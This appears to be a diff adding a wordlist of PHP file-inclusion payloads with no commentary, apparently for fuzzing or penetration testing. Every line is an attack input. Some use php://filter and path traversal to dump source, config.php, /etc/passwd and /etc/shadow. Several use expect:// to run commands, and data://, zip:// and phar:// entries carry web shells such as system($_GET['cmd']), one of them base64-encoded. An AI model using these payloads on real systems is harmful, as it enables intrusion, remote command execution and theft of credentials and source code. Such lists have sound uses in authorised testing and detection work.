@@ -1,0 +1,38 @@
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=../index.php
+php://filter/convert.base64-encode/resource=../../index.php
+php://filter/convert.base64-encode/resource=../../../index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=../../config.php
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=/etc/shadow
+php://filter/read=string.rot13/resource=index.php
+php://filter/read=string.rot13/resource=../index.php
+php://filter/read=string.rot13/resource=/etc/passwd
+php://input
+php://stdin
+php://memory
+php://temp
+expect://ls
+expect://id
+expect://whoami
+expect://cat /etc/passwd
+expect://cat%20/etc/passwd
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+data://text/plain,<?php phpinfo();?>
+data://text/plain,<?php system($_GET['cmd']);?>
+zip://shell.zip%23shell.php
+zip://shell.jpg%23shell.php
+phar://shell.phar/shell.php
+file:///etc/passwd
+file:///etc/shadow
+file:///var/www/html/index.php
+file://C:/windows/win.ini
+glob:///*
+ogg://
+ogg:///etc/passwd
+php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+php://filter/string.strip_tags/resource=index.php
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/convert.quoted-printable-encode/resource=index.php
